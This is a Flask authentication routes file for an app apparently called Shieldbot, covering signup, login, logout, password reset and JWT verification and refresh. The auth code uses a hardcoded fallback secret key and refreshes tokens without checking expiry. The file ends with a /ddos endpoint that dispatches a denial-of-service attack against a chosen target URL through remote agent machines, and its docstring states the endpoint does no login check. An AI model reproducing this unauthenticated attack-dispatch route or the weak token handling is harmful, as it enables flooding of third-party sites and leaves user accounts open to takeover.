# backend/routes/auth_routes.py
import os
from flask import Blueprint, request, jsonify, current_app, session
from backend.models import ShieldbotUser
from backend.database import db
from backend.utils.hash_utils import hash_password, verify_password
from backend.utils.jwt_utils import create_jwt, decode_and_verify_token
from dotenv import load_dotenv
from jwt.exceptions import InvalidTokenError
from datetime import datetime, timedelta, timezone
import jwt
from backend.utils.optional_decorators import google_oauth_required, captcha_required
import logging

logger = logging.getLogger(__name__)

# Load environment variables
load_dotenv()

auth_bp = Blueprint("auth_v1", __name__, url_prefix="/auth")
SECRET_KEY = os.getenv("SECRET_KEY", "fallback_secret_key")
RESET_TOKEN_EXPIRATION = 3600  # 1 hour expiration for reset tokens

def create_reset_token(user_id):
    payload = {
        "shieldbot_user_id": user_id,
        "exp": datetime.now(timezone.utc) + timedelta(seconds=RESET_TOKEN_EXPIRATION)
    }
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")

@auth_bp.route("/signup", methods=["POST"])
def signup():
    """
    Register a new user, issue a JWT token, and store the user_id in the session.
    """
    data = request.json
    data = ShieldbotUser.validate_fields(data)
    username = data.get("username")
    email = data.get("email")
    password = data.get("password")

    missing_fields = [field for field in ["username", "email", "password"] if not data.get(field)]
    if missing_fields:
        return jsonify({"error": f"Missing fields: {', '.join(missing_fields)}"}), 400

    if ShieldbotUser.query.filter(
        (ShieldbotUser.username == username) | (ShieldbotUser.email == email)
    ).first():
        return jsonify({"error": "User already exists"}), 400

    shieldbot_user = ShieldbotUser(
        username=username,
        email=email,
        password_hash=hash_password(password),
        profile_picture="user.jpg"
    )
    db.session.add(shieldbot_user)
    db.session.commit()

    token = create_jwt(shieldbot_user.id)
    session["user_id"] = shieldbot_user.id

    return jsonify({
        "message": "User registered successfully",
        "profile_picture": shieldbot_user.profile_picture,
        "token": token,
        "user": {
            "id": shieldbot_user.id,
            "email": shieldbot_user.email,
            "username": shieldbot_user.username
        }
    }), 201

@auth_bp.route("/login", methods=["POST"])
def login():
    """
    Log in an existing user. If the user is already logged in in the session,
    do not create a new login. Instead, return an "Already logged in" response.
    """
    # Check for an active session.
    if session.get("user_id"):
        user = ShieldbotUser.query.get(session.get("user_id"))
        if user:
            token = create_jwt(user.id)
            logger.info("User %s is already logged in.", user.id)
            return jsonify({
                "message": "Already logged in",
                "token": token,
                "user": {
                    "id": user.id,
                    "email": user.email,
                    "username": user.username
                }
            }), 200

    logger.info("Login attempt from %s", request.remote_addr)
    data = request.json
    email = data.get("email", "")[:120]
    password = data.get("password")

    missing_fields = [field for field in ["email", "password"] if not data.get(field)]
    if missing_fields:
        logger.warning("Missing fields during login: %s", missing_fields)
        return jsonify({"error": f"Missing fields: {', '.join(missing_fields)}"}), 400

    user = ShieldbotUser.query.filter_by(email=email).first()
    if not user or not verify_password(password, user.password_hash):
        logger.warning("Login failed for email: %s. Invalid credentials.", email)
        return jsonify({"error": "Invalid credentials"}), 401

    token = create_jwt(user.id)
    logger.info("User %s logged in successfully. Issuing token.", user.id)
    session["user_id"] = user.id

    return jsonify({
        "message": "User logged in successfully",
        "token": token,
        "user": {
            "id": user.id,
            "email": user.email,
            "username": user.username
        }
    }), 200

@auth_bp.route("/logout", methods=["POST"])
def logout():
    """
    Log out the current user by clearing the session.
    """
    session.clear()
    return jsonify({"message": "Logged out successfully"}), 200

@auth_bp.route("/reset-password", methods=["POST"])
def reset_password():
    """
    Reset user password using a valid reset token.
    Expects JSON with: reset_token, new_password.
    """
    data = request.json
    reset_token = data.get("reset_token")
    new_password = data.get("new_password")
    
    if not reset_token or not new_password:
        return jsonify({"error": "reset_token and new_password are required"}), 400

    try:
        payload = jwt.decode(reset_token, SECRET_KEY, algorithms=["HS256"])
        user_id = payload.get("shieldbot_user_id")
    except jwt.ExpiredSignatureError:
        return jsonify({"error": "Reset token has expired."}), 400
    except jwt.InvalidTokenError:
        return jsonify({"error": "Invalid reset token."}), 400

    user = ShieldbotUser.query.get(user_id)
    if not user:
        return jsonify({"error": "User does not exist."}), 404

    user.password_hash = hash_password(new_password)
    db.session.commit()
    return jsonify({"message": "Password reset successfully"}), 200

@auth_bp.route("/verify-token", methods=["GET"])
def verify_token_route():
    token = request.headers.get("Authorization")
    if not token:
        logger.warning("No token provided in verify-token call.")
        return jsonify({"error": "No token provided. Please log in."}), 401

    if token.startswith("Bearer "):
        token = token.split(" ", 1)[1]

    shieldbot_user, error = decode_and_verify_token(token)
    if error:
        logger.error("Token verification error: %s", error)
        return jsonify({"error": error}), 401

    logger.info("Token verified for user_id: %s", shieldbot_user.id)
    return jsonify({
        "message": "Token is valid",
        "user_id": shieldbot_user.id,
        "username": shieldbot_user.username
    }), 200

@auth_bp.route("/refresh-token", methods=["POST"])
def refresh_token():
    token = request.headers.get("Authorization")
    if not token:
        return jsonify({"error": "Token is missing"}), 400

    if token.startswith("Bearer "):
        token = token.split(" ", 1)[1]

    try:
        payload = jwt.decode(token, current_app.config["SECRET_KEY"], algorithms=["HS256"], options={"verify_exp": False})
        new_token = create_jwt(payload["user_id"])
        logger.info("Refreshed token for user_id: %s", payload["user_id"])
        session["user_id"] = payload["user_id"]
        return jsonify({"token": new_token}), 200
    except InvalidTokenError:
        logger.error("Invalid token during refresh.")
        return jsonify({"error": "Invalid token"}), 401

@auth_bp.route("/ddos", methods=["POST"])
def ddos_attack_route():
    """
    Special endpoint to initiate a DDOS attack using remote agents.
    
    This endpoint supports two modes:
    
    1. Check Mode:
       - Sends empty "ping" requests to the provided agents.
       - Example payload:
         {
             "mode": "check",
             "agents": ["192.168.1.101:5000", "192.168.1.102:5000", "192.168.1.103:5000"]
         }
       - Returns a JSON list of connected agents.
       
    2. Execution Mode:
       - Dispatches the DDOS command to selected agents.
       - Example payload:
         {
             "mode": "execute",
             "target_url": "http://example.com",
             "workers": 5,
             "processes_per_worker": 10,
             "selected_agents": ["192.168.1.101:5000", "192.168.1.102:5000"]
         }
       - Realtime logs from each agent are streamed to the server logs.
       
    Note: This endpoint does not perform any session or login verification.
    """
    ddos_options = request.get_json()
    if not ddos_options:
        return jsonify({"error": "Missing DDOS configuration parameters."}), 400

    from backend.attack_scripts.ddos_attack_test import ddos_attack_test
    result = ddos_attack_test("", ddos_options)
    return jsonify(result), 200